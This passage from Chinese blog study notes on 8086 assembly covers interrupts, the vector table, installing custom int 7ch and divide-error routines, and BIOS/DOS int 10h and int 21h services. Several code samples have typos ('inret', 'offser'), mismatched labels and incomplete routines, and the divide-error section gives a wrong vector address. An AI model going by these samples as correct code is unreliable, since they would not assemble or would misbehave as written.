              <time title="Erstellt: 2020-02-10 22:26:35" itemprop="dateCreated datePublished" datetime="2020-02-10T22:26:35-08:00">2020-02-10</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2020-02-11 14:26:50" itemprop="dateModified" datetime="2020-02-11T14:26:50-08:00">2020-02-11</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="int指令"><a href="#int指令" class="headerlink" title="int指令"></a>int指令</h2><p>int中断是一种重要的内中断，它的功能是引发中断过程。可以在程序中使用int指令调用任何一个中断的中断处理程序。可见int指令的最终功能和call指令相似，都是调用一段程序</p>
<p>因此一般情况下，系统将一些具有一定功能的子程序，以中断处理程序的方式提供给应用程序调用</p>
<p>我们在编程的时候，可以用int指令调用这些子程序。当然，也可以自己编写一些中断处理程序供别人使用。可以将中断处理程序简称为中断例程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int n ;n为中断类型码</span><br></pre></td></tr></table></figure>

<p>执行过程如下：</p>
<ul>
<li>取中断类型码n</li>
<li>标志寄存器入栈，IF=0，TF=0</li>
<li>CS、IP入栈</li>
<li>(IP)=(n<em>4)，(CS)=(n\</em>4+2)</li>
<li>从此转去执行n号中断的中断处理程序</li>
</ul>
<h4 id="例子一："><a href="#例子一：" class="headerlink" title="例子一："></a>例子一：</h4><p>安装程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">;编程：安装中断7ch的中断例程</span><br><span class="line">;功能：求一个word型数据的平方</span><br><span class="line">;参数：（ax）= 要计算的数据</span><br><span class="line">;返回值：dx、ax中存放结果的高16位和低16位</span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,cs </span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,offset sqr   ;设置ds:si指向源地址</span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,200h         ;设置es:di指向目的地址</span><br><span class="line">        mov cx,offset sqrend - offset sqr   ;设置cx为传输长度</span><br><span class="line">        cld                 ;设置传输方向为正</span><br><span class="line">        rep movsb</span><br><span class="line"></span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov word ptr es:[7ch*4],200h</span><br><span class="line">        mov word ptr es:[7ch*4+2],0</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">sqr:</span><br><span class="line">        mul ax</span><br><span class="line">        inret 				;pop IP pop CS popf</span><br><span class="line">sqrend:</span><br><span class="line">        nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line">;编程实现求平方功能的程序</span><br><span class="line">;安装程序，我们将其安装在0:200处</span><br><span class="line">;设置中断向量表，将程序的入口地址保存在7ch表项中，使其成为中断7ch的中断例程</span><br></pre></td></tr></table></figure>

<p>调用测试程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,3456</span><br><span class="line">        int 7ch         ;调用中断7ch的中断例程，计算ax中的数据的平方</span><br><span class="line">        add ax,ax</span><br><span class="line">        adc dx,dx       ;存放结果，将结果乘以2</span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h4 id="例子二："><a href="#例子二：" class="headerlink" title="例子二："></a>例子二：</h4><p>安装程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,cs</span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,offset capital</span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,200h</span><br><span class="line">        mov cx,offset capitalend - offset capital</span><br><span class="line">        cld</span><br><span class="line">        rep movsb</span><br><span class="line"></span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov word ptr es:[7ch*4],200h</span><br><span class="line">        mov word ptr es:[7ch*4+2],0</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">capital:</span><br><span class="line">        push cx</span><br><span class="line">        push si</span><br><span class="line">change:</span><br><span class="line">        mov cl,[si]</span><br><span class="line">        mov ch,0</span><br><span class="line">        jcxz ok</span><br><span class="line">        and byte ptr [si],11011111b</span><br><span class="line">        inc si</span><br><span class="line">        jmp short change</span><br><span class="line">ok:</span><br><span class="line">        pop si</span><br><span class="line">        pop cx</span><br><span class="line">        iret </span><br><span class="line">capitalend:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>测试程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">data segment</span><br><span class="line">    db &apos;conversation&apos;,0</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,data </span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,0</span><br><span class="line">        int 7ch  </span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>这里主要是在中断例程capital中用到了寄存器si和cx，编写中断例程和编写子程序的时候具有同样的问题，就是要避免寄存器的冲突</p>
<p>总而言之就是要注意用到的寄存器的值的保存和恢复</p>
<h2 id="使用bp代替sp"><a href="#使用bp代替sp" class="headerlink" title="使用bp代替sp"></a>使用bp代替sp</h2><p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lp:</span><br><span class="line">	push bp</span><br><span class="line">	mov bp,sp</span><br><span class="line">	dec cx</span><br><span class="line">	jcxz lpret</span><br><span class="line">	add [bp+2],bx</span><br><span class="line">lpret:</span><br><span class="line">	pop bp</span><br><span class="line">	iret</span><br></pre></td></tr></table></figure>

<p>用bp寄存器保存调用前栈的sp，用bp代替sp，保证栈不容易被破坏，在结束函数调用后，弹出bp恢复sp</p>
<h2 id="BIOS和DOS中断例程的安装过程"><a href="#BIOS和DOS中断例程的安装过程" class="headerlink" title="BIOS和DOS中断例程的安装过程"></a>BIOS和DOS中断例程的安装过程</h2><p>之前我们都是自己编写中断例程，将它们放在安装程序中，然后通过运行安装程序，将他们安装到指定的内存区中，此后，别的应用程序才可以调用，那BIOS和DOS提供的中断例程是如何安装到内存中的呢？</p>
<ul>
<li>开机后，CPU一加电，初始化(CS)=0FFFFH，(IP)=0，自动从FFFF:0单元开始执行程序。在FFFF:0处有一条跳转指令，CPU执行该指令后，转去执行BIOS中的硬件系统检测和初始化程序</li>
<li>初始化程序将建立BIOS所支持的中断向量，即将BIOS提供的中断例程的入口地址登记在中断向量表中</li>
<li>硬件系统检测和初始化完成后，调用int 19h经行操作系统的引导，从此将计算机交由操作系统控制</li>
<li>DOS启动后，除完成其他工作外，还将它所提供的中断例程装入内存，并建立相应的中断向量</li>
</ul>
<h2 id="BIOS中断例程应用"><a href="#BIOS中断例程应用" class="headerlink" title="BIOS中断例程应用"></a>BIOS中断例程应用</h2><p>一般来说，一个供程序员调用的中断例程中往往包括多个子程序，中断例程内部用传递进来的参数来决定执行哪个子程序。BIOS和DOS提供的中断例程，都用ah来传递内部子程序的编号</p>
<p>例如int 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序</p>
<h4 id="设置光标位置"><a href="#设置光标位置" class="headerlink" title="设置光标位置"></a>设置光标位置</h4><p>利用int 10h中断例程设置光标的位置功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ah,2	;表示调用第10h号中断例程的2号子程序</span><br><span class="line">mov bh,0	;设置光标到第0页</span><br><span class="line">mov dh,5	;第5行</span><br><span class="line">mov dl,12	;第12列</span><br><span class="line">int 10h</span><br></pre></td></tr></table></figure>

<p>(ah)=2表示调用第10h号中断例程的2号子程序，功能为设置光标位置，可以提供光标所在的行号（80*25字符模式下：0<del>24）、列号（80*25字符模式下：0</del>79），和页号作为参数</p>
<ul>
<li>bh中页号的含义：在内存地址空间中，B8000h~BFFFFh共32K的空间，为80*25彩色字符模式的显示缓冲区</li>
<li>一屏的内容在现实缓冲区中共占4000个字节</li>
<li>也就是说，通常情况下，B8000h~BFF9Fh中的4000个字节的内容将出现在显示器上</li>
</ul>
<h4 id="显示字符"><a href="#显示字符" class="headerlink" title="显示字符"></a>显示字符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ah,9	;放置光标</span><br><span class="line">mov al,&apos;a&apos;	;字符</span><br><span class="line">mov bl,7	;颜色属性</span><br><span class="line">mov bh,0	;第0页</span><br><span class="line">mov cx,3	;字符重复个数</span><br><span class="line">int 10h</span><br></pre></td></tr></table></figure>

<p>bl中的颜色属性格式如下：</p>
<table>
<thead>
<tr>
<th align="center">7</th>
<th align="center">6</th>
<th align="center">5</th>
<th align="center">4</th>
<th align="center">3</th>
<th align="center">2</th>
<th align="center">1</th>
<th align="center">0</th>
</tr>
</thead>
<tbody><tr>
<td align="center">BL</td>
<td align="center">R</td>
<td align="center">G</td>
<td align="center">B</td>
<td align="center">I</td>
<td align="center">R</td>
<td align="center">G</td>
<td align="center">B</td>
</tr>
<tr>
<td align="center">闪烁</td>
<td align="center">背景</td>
<td align="center">背景</td>
<td align="center">背景</td>
<td align="center">高亮</td>
<td align="center">前景</td>
<td align="center">前景</td>
<td align="center">前景</td>
</tr>
</tbody></table>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">;在屏幕的5行12列显示3个红底高亮闪烁绿色的&apos;a&apos;</span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">strat:</span><br><span class="line">        mov ah,2	;表示调用第10h号中断例程的2号子程序</span><br><span class="line">        mov bh,0	;设置页</span><br><span class="line">        mov dh,5	;ah中放行号</span><br><span class="line">        mov dl,12	;dl中放列号</span><br><span class="line">        int 10h</span><br><span class="line"></span><br><span class="line">        mov ah,9	;放置光标</span><br><span class="line">        mov al,&apos;a&apos;	;字符</span><br><span class="line">        mov bl,11001010b	;颜色属性</span><br><span class="line">        mov bh,0	;第0页</span><br><span class="line">        mov cx,3	;字符重复个数</span><br><span class="line">        int 10h</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h2 id="DOS中断例程应用"><a href="#DOS中断例程应用" class="headerlink" title="DOS中断例程应用"></a>DOS中断例程应用</h2><p>int 21h中断例程是DOS提供的中断例程，其中包括了DOS提供给程序员在编程时调用的子程序</p>
<h4 id="程序返回"><a href="#程序返回" class="headerlink" title="程序返回"></a>程序返回</h4><p>我们从前一直使用的是int 21中断例程的4ch号功能，即程序返回功能，可以提供返回值作为参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ah,4ch</span><br><span class="line">mov al,0</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>

<p>我们一般合并写成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>

<h4 id="光标位置显示字符串"><a href="#光标位置显示字符串" class="headerlink" title="光标位置显示字符串"></a>光标位置显示字符串</h4><p>(ah)=9表示调用第21h号中断例程的9号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ds:ds指向字符串	;要显示的字符串需用&quot;$&quot;作为结束符</span><br><span class="line">mov ah,9	   ;功能号9，表示在光标位置显示字符串</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/8086╗π▒α▒╩╝╟05/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/10/8086╗π▒α▒╩╝╟05/" class="post-title-link" itemprop="url">8086汇编笔记05</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-10 02:15:12 / Geändert am: 18:15:30" itemprop="dateCreated datePublished" datetime="2020-02-10T02:15:12-08:00">2020-02-10</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>中断是CPU处理外部突发事件的一个重要技术，它能使CPU在运行过程中对外部事件发出的中断请求及时地进行处理，处理完成后又立即返回断点，继续进行CPU原来的工作。引起中断的原因或者说发出中断请求的来源叫做中断源。根据中断源的不同，可以把中断分为<strong>硬件中断</strong>和<strong>软件中断</strong>两大类，而硬件中断又可以分为<strong>外部中断</strong>和<strong>内部中断</strong>两类</p>
<p>CPU为了处理并发的中断请求，规定了中断的优先权，中断优先权由高到低的顺序是：</p>
<ol>
<li>除法错、溢出中断、软件中断</li>
<li>不可屏蔽中断</li>
<li>可屏蔽中断</li>
<li>单步中断s</li>
</ol>
<h2 id="外部中断"><a href="#外部中断" class="headerlink" title="外部中断"></a>外部中断</h2><p>外部中断一般是指由计算机外设发出的中断请求，如：键盘中断、打印机中断、定时器中断等。外部中断使可以屏蔽的中断，也就是说，利用中断控制器可以屏蔽这些外部设备的中断请求</p>
<h2 id="内部中断"><a href="#内部中断" class="headerlink" title="内部中断"></a>内部中断</h2><p>内部中断是指因硬件出错（突然掉电、奇偶校验错等）或运算出错（除数为零、运算溢出、单步中断等）所引起的中断。内部中断是不可屏蔽的中断</p>
<h2 id="软件中断"><a href="#软件中断" class="headerlink" title="软件中断"></a>软件中断</h2><p>软件中断其实并不是真正的中断，它们只是可被调用执行的一般程序以及DOS的系统功能调用（INT 21H）等都是软件中断</p>
<h2 id="中断处理程序"><a href="#中断处理程序" class="headerlink" title="中断处理程序"></a>中断处理程序</h2><p>CPU的设计者必须在中断信息和其处理程序的入口地址之间建立某种联系，使得CPU根据中断信息可以找到要执行的处理程序。中断信息中包含有标识中断源的类型码，根据CPU的设计，中断类型码的作用就是用来定位中断处理程序，比如CPU根据中断程序码4，就可以找到4号中断的处理程序</p>
<p>若要定位中断处理程序，需要知道它的段地址和偏移地址，如果需要根据8位的中断类型码（8086中断类型码为一个字节）得到中断处理程序的段地址和偏移地址，需要引入“中断向量表”</p>
<h2 id="中断向量表"><a href="#中断向量表" class="headerlink" title="中断向量表"></a>中断向量表</h2><p>CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址，中断向量表就是中断向量的列表</p>
<table>
<thead>
<tr>
<th align="center">0号中断元对应的中断处理程序的入口地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>1号中断元对应的中断处理程序的入口地址</strong></td>
</tr>
<tr>
<td align="center"><strong>2号中断元对应的中断处理程序的入口地址</strong></td>
</tr>
<tr>
<td align="center"><strong>……</strong></td>
</tr>
</tbody></table>
<p>中断向量表在内存中保存，其中存放着256个中断源所对应的中断处理程序的入口。<strong>对于8086PC机，中断向量表指定放在内存地址0处，从内存0000:0000到0000:03FF的1024个单元</strong></p>
<h2 id="中断过程"><a href="#中断过程" class="headerlink" title="中断过程"></a>中断过程</h2><p>CPU硬件完成中断工作的过程被称为中断过程：</p>
<ul>
<li>利用中断类型码，在中断向量表中找到中断处理程序的入口</li>
<li>找到这个入口地址的最终目的是用它设置CS和IP，使CPU执行中断处理程序</li>
<li>用中断类型码找到中断向量，并用它设置CS和IP，这个工作是由CPU的硬件自动完成的</li>
</ul>
<p>8086CPU的中断过程：</p>
<ul>
<li>从中断信息中取得中断类型码</li>
<li>标志寄存器的值入栈（保护标志位）</li>
<li>设置标志寄存器的第8位TF和第9位IF的值为0</li>
<li>CS的内容入栈</li>
<li>IP的内容入栈</li>
<li>从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取中断处理程序的入口地址设置IP和CS</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.取得中断类型码N；</span><br><span class="line">2.pushf</span><br><span class="line">3.TF=0，IF=0</span><br><span class="line">4.push CS</span><br><span class="line">5.push IP</span><br><span class="line">6.(IP)=(N*4)，(CS)=(N*4+2)</span><br></pre></td></tr></table></figure>

<h2 id="中断处理程序-1"><a href="#中断处理程序-1" class="headerlink" title="中断处理程序"></a>中断处理程序</h2><p>由于CPU随时都可能检测到中断信息，也就是说，CPU随时都可能执行中断处理程序，所以中断处理程序必须一直存储在内存某段空间之中，而中断处理程序的入口地址，即中断向量，必须存储在对应的中断向量表表项中</p>
<p>中断处理程序的编写方法和子程序的比较相似，下面是常规的步骤：</p>
<ul>
<li>保存用到的寄存器</li>
<li>处理中断</li>
<li>恢复用到的寄存器</li>
<li>用iret指令返回<ul>
<li>iret指令的功能用汇编语法描述为：<ul>
<li>pop IP</li>
<li>pop CS</li>
<li>popf</li>
</ul>
</li>
<li>iret通常和硬件自动完成的中断过程配合使用</li>
</ul>
</li>
</ul>
<p>可以看到，在中断过程中，寄存器入栈的顺序是标志寄存器、CS、IP，而iret的出栈顺序是IP、CS、标志寄存器，刚好和其对应，实现了用执行中断处理程序前的CPU现场恢复标志寄存器和CS、IP的工作</p>
<h2 id="除法错误中断的处理"><a href="#除法错误中断的处理" class="headerlink" title="除法错误中断的处理"></a>除法错误中断的处理</h2><p>当CPU执行div等除法指令的时候，如果发生了除法溢出错误，将产生中断类型码为0的中断信息，CPU将检测到这个信息，然后引发中断过程，转去执行0号中断所对应的中断处理程序</p>
<h2 id="编程处理0号中断"><a href="#编程处理0号中断" class="headerlink" title="编程处理0号中断"></a>编程处理0号中断</h2><ul>
<li>当发生除法溢出的时候，产生0号中断信息，从而引发中断过程，此时CPU经行以下工作<ul>
<li>取得中断类型码0</li>
<li>标志寄存器入栈，TF、IF设置为0</li>
<li>CS、IP入栈</li>
<li>(IP)=(0<em>4)，(CS)=(0\</em>4+2)</li>
</ul>
</li>
<li>可见当中断0发生时，CPU将去执行处理程序，要显示特定字符串只需这样写：<ul>
<li>相关处理</li>
<li>向显示缓冲区送字符串”Welcome to”</li>
<li>返回DOS</li>
</ul>
</li>
<li>必须将do 0 的入口地址等级在中断向量表的对应表项中，因为除法溢出对应的中断类型码为0则：<ul>
<li>入口地址应该从0x4地址单元开始存放</li>
<li>段地址存放在0x4+2字单元中</li>
<li>偏移地址存放在0x4字单元中</li>
</ul>
</li>
<li>总结上面的分析：<ul>
<li>编写可以显示字符串的中断处理程序：do 0</li>
<li>将do 0送入内存0000:0200处</li>
<li>将do 0的入口地址0000:0200存储在中断向量表0号表项中</li>
</ul>
</li>
</ul>
<p>普通的示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">data segment</span><br><span class="line">        db &quot;Hello World!&quot;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,cs </span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,offser dp0   ;设置ds:si指向源地址</span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,200h         ;设置es:di指向目的地址</span><br><span class="line">        mov cx,offset do0end- offset do0    ;设置cx为传输长度</span><br><span class="line">        cld                 ;设置传输方向为正</span><br><span class="line">        rep movsb</span><br><span class="line"></span><br><span class="line">        mov ax,0;设置中断向量表</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov word ptr es:[0*4],200h</span><br><span class="line">        mov word ptr es:[0*4+2],0</span><br><span class="line"></span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">do0:    ;显示字符串</span><br><span class="line">        mov ax,data </span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,0            ;设置ds:si指向字符串</span><br><span class="line">        mov ax,0b800h</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,12*160+36*2  ;设置es:di指向显存空间的中间位置</span><br><span class="line">        mov cx,21           ;设置cx为字符串长度</span><br><span class="line">doend:</span><br><span class="line">        nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line">;&quot;-&quot;是编译器可以识别的运算符号，两个常数的减法，编译器还可以处理很多表达式</span><br></pre></td></tr></table></figure>

<p>但是这样有一个问题，字符串存放在程序的data段中。程序执行完成后返回，它所占用的内存空间被系统释放，而在其中存放的字符串也将很可能被别的信息覆盖，很难保证do0程序从原来程序program1所处的空间中取得的是要显示的字符串。所以该字符串也应该存放在一段不会被覆盖的空间中</p>
<p>所以，改进后将数据存放到代码段中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">        mov ax,cs </span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,offser dp0   ;设置ds:si指向源地址</span><br><span class="line">        mov ax,0</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,200h         ;设置es:di指向目的地址</span><br><span class="line">        mov cx,offset do0end- offset do0    ;设置cx为传输长度</span><br><span class="line">        cld                 ;设置传输方向为正</span><br><span class="line">        rep movsb</span><br><span class="line"></span><br><span class="line">        mov ax,0;设置中断向量表</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov word ptr es:[0*4],200h</span><br><span class="line">        mov word ptr es:[0*4+2],0</span><br><span class="line">        </span><br><span class="line">        mov ax,4c00h</span><br><span class="line">        int 21h</span><br><span class="line">do0:    </span><br><span class="line">        jmp short do0start</span><br><span class="line">        db  &quot;Hello World&quot;   ;将数据存放在代码段</span><br><span class="line">do0start:</span><br><span class="line">        mov ax,cs</span><br><span class="line">        mov ds,ax</span><br><span class="line">        mov si,202h         ;设置ds:si指向字符串</span><br><span class="line">        mov ax,0b800h</span><br><span class="line">        mov es,ax</span><br><span class="line">        mov di,12*160+36*2  ;设置es:di指向显存空间的中间位置</span><br><span class="line">        mov cx,21           ;设置cx为字符串长度</span><br><span class="line">doend:</span><br><span class="line">        nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h2 id="单步中断"><a href="#单步中断" class="headerlink" title="单步中断"></a>单步中断</h2><p>只有CPU提供了在执行一条指令后就转去做其他事情的能力，Debug或是其他的程序才能利用CPU提供的这种功能做出我们使用T命令时的效果</p>
<p>CPU在执行完一条指令之后，如果检测到标志寄存器的TF位为1，则产生单步中断，引发终端过程</p>
<p>单步中断的中断类型码为1，则它所引发的中断过程如下：</p>
<ul>
<li>取得中断类型码1</li>
<li>标志寄存器入栈，TF、IF设置为0</li>
<li>CS、IP入栈</li>
<li>(IP)=(1<em>4),(CS)=(1\</em>4+2)</li>
</ul>
<p>所以如果TF=1，则执行一条指令后，CPU就要转去执行1号中断处理程序</p>
<p>在使用T命令执行指令时，Debug将TF设置为1，使得CPU在工作于单步中断方式下，则在CPU执行完这条指令后就引发单步中断，执行单步中断的中断处理程序，所有寄存器中的内容被显示在屏幕上，并且等待输入命令</p>
<h2 id="响应中断的特殊情况"><a href="#响应中断的特殊情况" class="headerlink" title="响应中断的特殊情况"></a>响应中断的特殊情况</h2><p>在有些情况下，CPU在执行完当前指令后，即便是发生中断，也不会响应</p>
